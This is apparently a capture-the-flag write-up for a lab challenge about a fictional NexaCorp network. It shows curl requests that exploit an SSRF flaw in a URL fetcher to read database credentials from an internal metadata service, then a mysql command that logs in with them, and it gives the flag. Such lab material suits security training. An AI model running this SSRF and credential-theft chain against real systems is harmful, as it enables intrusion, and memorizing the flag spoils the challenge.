# Stage 8: Core Infrastructure Breach (Network Pivoting & SSRF)

## Overview
- **Domain:** Network Pivoting & Cloud Metadata SSRF
- **Difficulty:** Hard
- **Points:** 500
- **Flag:** `SHADOWNET{FULL_NETWORK_BREACH_COMPLETE}`

---

## Architecture
- **Entry Host:** Public perimeter gateway running URL fetcher on port `3008` (or `3000`).
- **Database Host:** Isolated internal subnet at `192.168.100.10`, running:
  - Internal Cloud Metadata Service (port `8080`)
  - Internal MySQL Database (port `3306`)

---

## Exploitation Walkthrough

### 1. Access Entry Host
```bash
curl http://localhost:3008/
```
Displays the NexaCorp Internal URL Fetcher page.

### 2. Discover & Exploit SSRF Vulnerability
The `/fetch` endpoint accepts an arbitrary `url` parameter without internal IP restriction:
```bash
curl -s "http://localhost:3008/fetch?url=http://192.168.100.10:8080/metadata/db-credentials" | jq .
```

Response:
```json
{
  "content": "{\"database\":\"nexacorp\",\"host\":\"192.168.100.10\",\"password\":\"SecurePass123\",\"port\":3306,\"username\":\"db_user\"}\n",
  "status": 200,
  "url": "http://192.168.100.10:8080/metadata/db-credentials"
}
```

### 3. Query All Cloud Metadata
```bash
curl -s "http://localhost:3008/fetch?url=http://192.168.100.10:8080/metadata/all" | jq .
```

### 4. Connect to Internal Database
Using the credentials retrieved via SSRF (`db_user:SecurePass123` on MySQL `192.168.100.10:3306`):
```bash
mysql -h 192.168.100.10 -u db_user -pSecurePass123 -D nexacorp -e "SELECT flag FROM flags WHERE challenge='final_breach';"
```

### 5. Final Flag Output
```
SHADOWNET{FULL_NETWORK_BREACH_COMPLETE}
```
